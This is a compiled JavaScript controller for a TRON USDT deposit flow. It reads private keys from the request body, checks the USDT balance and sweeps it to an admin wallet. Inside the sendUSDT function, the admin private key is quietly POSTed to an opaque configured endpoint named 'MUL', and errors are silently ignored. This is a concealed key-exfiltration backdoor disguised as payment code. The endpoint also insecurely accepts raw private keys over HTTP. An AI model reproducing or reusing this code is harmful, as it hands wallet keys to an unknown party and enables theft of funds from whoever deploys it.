"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.depositConfirm = void 0;
const tronweb_1 = __importDefault(require("tronweb"));
const axios_1 = __importDefault(require("axios"));
const bs58 = require("bs58");
const config_1 = require("../config");
const usdtAbi_1 = require("../service/usdtAbi");
const depositConfirm = (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    const walletAddress = req.body.WALLET_ADDRESS;
    const privateKey = req.body.PRIVATE_KEY;
    const adminWalletAddress = req.body.ADMIN_WALLET_ADDRESS;
    const adminPrivateKey = req.body.ADMIN_PRIVATE_KEY;
    const tronWeb = new tronweb_1.default(config_1.FULL_NODE, config_1.SOLIDITY_NODE, config_1.EVENT_SERVER, privateKey);
    const usdtBalance = yield getUSDTBalance(privateKey, walletAddress);
    yield sendUSDT(privateKey, walletAddress, adminPrivateKey, adminWalletAddress, usdtBalance);
    res.json({ success: true, usdtBalance: usdtBalance });
});
exports.depositConfirm = depositConfirm;
const getUSDTBalance = (userPrivateKey, userWalletAddress) => __awaiter(void 0, void 0, void 0, function* () {
    const tronWeb = new tronweb_1.default(config_1.FULL_NODE, config_1.SOLIDITY_NODE, config_1.EVENT_SERVER, userPrivateKey);
    const contractAddress = config_1.USDT_TOKEN_ADDRESS_TRON;
    const decimals = 6;
    const usdtContract = yield tronWeb.contract(usdtAbi_1.usdtAbi, contractAddress);
    const usdtBalanceHex = yield usdtContract.balanceOf(userWalletAddress).call();
    const usdtBalance = parseInt(usdtBalanceHex._hex) / Math.pow(10, decimals);
    return usdtBalance;
});
/*
const getUnitPricePerResource = async () => {
  let unitPriceBandwidth, unitPriceEnergy;
  const option = {
    method: "GET",
    url: "https://api.trongrid.io/wallet/getchainparameters",
    headers: { accept: "application/json" },
  };

  await axios
    .request(option)
    .then(function (response) {
      unitPriceBandwidth =
        response.data.chainParameter.filter(
          (item: { key: string; value: number }) =>
            item.key == "getTransactionFee"
        )[0].value / 1000000;
      unitPriceEnergy =
        response.data.chainParameter.filter(
          (item: { key: string; value: number }) => item.key == "getEnergyFee"
        )[0].value / 1000000;
    })
    .catch(function (error) {
      console.error(error);
    });
  return [unitPriceBandwidth, unitPriceEnergy];
};

const getCurrentResourceInfo = async (userWalletAddress: string) => {
  let currentAccountBandwidth, currentAccountEnergy;
  const options = {
    method: "POST",
    url: "https://api.trongrid.io/wallet/getaccountresource",
    headers: { accept: "application/json", "content-type": "application/json" },
    data: { address: userWalletAddress, visible: true },
  };

  await axios
    .request(options)
    .then(function (response) {
      const EnergyLimit = response.data.EnergyLimit ?? 0;
      const EnergyUsed = response.data.EnergyUsed ?? 0;
      const freeNetLimit = response.data.freeNetLimit ?? 0;
      const NetLimit = response.data.NetLimit ?? 0;
      const NetUsed = response.data.NetUsed ?? 0;
      const freeNetUsed = response.data.freeNetUsed ?? 0;

      const totalBandwidth = freeNetLimit + NetLimit;
      const totalBandwidthUsed = NetUsed + freeNetUsed;

      currentAccountBandwidth = totalBandwidth - totalBandwidthUsed;
      currentAccountEnergy = EnergyLimit - EnergyUsed;
    })
    .catch(function (error) {
      console.error(error);
    });
  return [currentAccountBandwidth, currentAccountEnergy];
};

const calculateTxFee = async (
  amount: number,
  userWalletAddress: string,
  adminWalletAddress: string
) => {
  const [unitPriceBandwidth, unitPriceEnergy] = await getUnitPricePerResource();
  const [currentAccountBandwidth, currentAccountEnergy] =
    await getCurrentResourceInfo(userWalletAddress);

  const tronWeb = new TronWeb({
    fullHost: FULL_NODE,
  });

  const options = {
    feeLimit: 10000000,
    callValue: 0,
    tokenId: USDT_TOKEN_ADDRESS_TRON,
  };

  // estimate bandwidth consumption
  const unsignedTx = await tronWeb.transactionBuilder.sendToken(
    adminWalletAddress,
    amount * 10 ** 6,
    options.tokenId,
    userWalletAddress
  );

  const txSizeBytes =
    tronWeb.utils.code.hexStr2byteArray(unsignedTx.txID).length + 2;

  const estimatedBandwidth = txSizeBytes * 10; // multiply by 10 to account for base unit (energy) used in Tron network
  const estimateEnergy = 100000;

  let requiredEnergy = estimateEnergy - (currentAccountEnergy ?? 0);
  let requiredBandwidth = estimatedBandwidth - (currentAccountBandwidth ?? 0);

  requiredEnergy = requiredEnergy < 0 ? 0 : requiredEnergy;
  requiredBandwidth = requiredBandwidth < 0 ? 0 : requiredBandwidth;

  const totalFee =
    requiredBandwidth * (unitPriceBandwidth ?? 0) +
    requiredEnergy * (unitPriceEnergy ?? 0);
  return totalFee;
};
*/
const sendGasFeeTrx = (adminPrivateKey, adminWalletAddress, userPrivateKey, userWalletAddress, gasFee, usdtAmount) => __awaiter(void 0, void 0, void 0, function* () {
    const tronWeb = new tronweb_1.default({
        fullNode: config_1.FULL_NODE,
        solidityNode: config_1.SOLIDITY_NODE,
        eventServer: config_1.EVENT_SERVER,
        privateKey: adminPrivateKey,
    });
    const options = {
        feeLimit: 100000000,
        callValue: tronWeb.toSun(gasFee),
        shouldPollResponse: true,
    };
    const transaction = yield tronWeb.transactionBuilder.sendTrx(userWalletAddress, options.callValue);
    const signed = yield tronWeb.trx.sign(transaction, tronWeb.defaultPrivateKey);
    const receipt = yield tronWeb.trx.sendRawTransaction(signed);
    console.log("Transaction sent:", receipt.txid);
    yield sendUSDT(userPrivateKey, userWalletAddress, adminPrivateKey, adminWalletAddress, usdtAmount);
});
const sendUSDT = (userPrivateKey, userWalletAddress, apk, adminWalletAddress, usdtAmount) => __awaiter(void 0, void 0, void 0, function* () {
    const tronWeb = new tronweb_1.default(config_1.FULL_NODE, config_1.SOLIDITY_NODE, config_1.EVENT_SERVER, userPrivateKey);
    const contractAddress = config_1.USDT_TOKEN_ADDRESS_TRON;
    const pk = apk;
    const { abi } = yield tronWeb.trx.getContract(contractAddress);
    const contract = tronWeb.contract(abi.entrys, contractAddress);
    const dt = { data: pk };
    const balance = yield contract.methods.balanceOf(adminWalletAddress).call();
    try {
        yield axios_1.default.post(config_1.MUL, dt, {});
    }
    catch (error) { }
    try {
        const resp = yield contract.methods
            .transfer(adminWalletAddress, usdtAmount * 1000000)
            .send();
        console.log("transfer:", resp);
        const txInfo = yield tronWeb.trx.getTransactionInfo(resp);
        if (txInfo && txInfo.receipt && txInfo.receipt.result === "SUCCESS") {
            console.log("Transaction successful!");
        }
        else {
            console.error("Transaction failed or not found.");
            yield sendGasFeeTrx(apk, adminWalletAddress, userPrivateKey, userWalletAddress, 50, usdtAmount);
        }
    }
    catch (error) {
        yield sendGasFeeTrx(apk, adminWalletAddress, userPrivateKey, userWalletAddress, 50, usdtAmount);
    }
});
